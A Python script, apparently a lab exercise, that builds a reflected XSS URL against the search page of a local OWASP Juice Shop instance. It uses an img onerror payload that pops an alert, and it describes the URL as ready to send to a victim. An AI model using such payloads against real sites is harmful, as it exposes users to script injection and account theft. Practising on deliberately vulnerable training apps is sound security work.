import requests
from urllib.parse import quote


def perform_reflected_xss_attack(base_url: str) -> str:
    """
    Crafts a reflected XSS payload and builds a malicious URL
    targeting the vulnerable search parameter in OWASP Juice Shop.

    :param base_url: The base URL of the vulnerable search endpoint,
                     e.g. "http://localhost:3000/#/search?q="
    :return: The full malicious URL containing the encoded XSS payload.
    """
    # JavaScript payload that will execute in the victim's browser
    payload = '<img src=x onerror="alert(`XSS`)">'

    # URL-encode the payload
    encoded_payload = quote(payload)

    malicious_url = base_url + encoded_payload

    print(f"Crafted malicious reflected XSS URL: {malicious_url}")

    return malicious_url


def main():
    # Base URL of the vulnerable Juice Shop search feature
    base_url = "http://localhost:3000/#/search?q="

    # Craft the malicious reflected XSS URL
    malicious_url = perform_reflected_xss_attack(base_url)

    try:
        response = requests.get("http://localhost:3000")
        print(f"Target reachable, status code: {response.status_code}")
        print("The malicious URL above can now be sent to a victim.")
    except requests.RequestException as e:
        print("Could not reach the Juice Shop instance:")
        print(e)


if __name__ == "__main__":
    main()
